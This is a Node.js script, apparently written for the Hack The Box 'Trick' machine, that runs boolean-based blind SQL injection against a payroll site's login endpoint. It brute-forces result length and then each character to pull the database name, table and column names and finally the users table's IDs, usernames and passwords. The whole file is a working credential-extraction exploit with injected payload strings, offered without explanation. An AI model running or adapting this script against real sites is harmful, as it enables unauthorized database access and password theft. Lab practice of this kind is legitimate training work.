#!/usr/bin/env node

// Ctrl+C
process.on('SIGINT', () => {
  console.log('\n[!] Saliendo...\n');
  process.exit(1);
});

// Variables globales
let loginUrl = 'http://preprod-payroll.trick.htb/ajax.php?action=login';

const sqliRequest =  async (sqlQuery) => {
  const requestParams = new URLSearchParams();
  requestParams.append('username', sqlQuery);
  requestParams.append('password', "test");

  const response = await fetch(loginUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: requestParams.toString()
  });

  return await response.text();
}

const main = async () => {
  let content = '';
  let content_length = 0;

  // Current Database...
  // const sqlSearchData = 'database()';
  // const sqlSource = '';
  
  // Tables in Current Database...
  // const sqlSearchData = 'group_concat(table_name)';
  // const sqlSource = " from information_schema.tables where table_schema='payroll_db'";

  // Columns in Table Users...
  // const sqlSearchData = 'group_concat(column_name)';
  // const sqlSource = " from information_schema.columns where table_name='users'";

  // Columns in Table Users...
  const sqlSearchData = "group_concat(id,':',doctor_id,':',name,':',username,':',password,':',type)";
  const sqlSource = " from users";

  for (let number = 0; number < 2000; number++) {
    let sqlQuery = `' or (select length(${sqlSearchData})${sqlSource})='${number}' -- -`;

    process.stdout.write(`\r[+] Length Status: ${sqlQuery}`);

    const response = await sqliRequest(sqlQuery);

    if (response === '1') {
      content_length = number;
      console.log();
      break;
    }
  }

  for (let position = 1; position < content_length + 1; position++) {
    for (let character = 0; character < 128; character++) {
      let sqlQuery = `' or (select ascii(substring(${sqlSearchData},${position},1))${sqlSource})='${character}' -- -`;

      process.stdout.write(`\r[+] Result: ${content} | Position: ${position} - Character: ${character}`);
      
      const response = await sqliRequest(sqlQuery);

      if (response === '1') {
        content += String.fromCharCode(character);
        (position === content_length) && process.stdout.write(`\r[+] Success: ${content}`);
        break;
      }
    }
  }

  
};

(async () => {
  await main();
})();
